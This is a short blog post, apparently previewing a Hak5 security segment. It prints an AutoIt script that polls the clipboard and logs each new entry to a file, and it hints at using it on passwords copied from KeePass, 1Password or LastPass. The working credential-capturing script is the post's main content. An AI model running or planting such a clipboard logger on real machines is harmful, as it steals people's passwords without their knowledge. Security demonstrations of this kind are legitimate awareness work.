= Hak5 Segment Sneak Peak
:hp-tags: hak5, releases, clipboard, autoit

Since it's Christmas and all, I thought I'd post the code snippet from my Hak5 segment a bit early:

```
#include <Clipboard.au3>
#include <File.au3>
$oldclip = ""
While 1
    $clip = _ClipBoard_GetData()
    If $clip <> "0" Then
        If $clip <> $oldclip Then
            _FileWriteLog(@UserProfileDir & "clip.log", $clip)
            $oldclip = $clip
        EndIf
    EndIf
    Sleep(100)
WEnd
```    

It's pretty straight forward, and I welcome everyone to install AutoIt3 and compile/run the above script to see what it does (although most of you I'm sure can figure it out just by reading it).

(Think KeePass, 1Password, LastPass...)
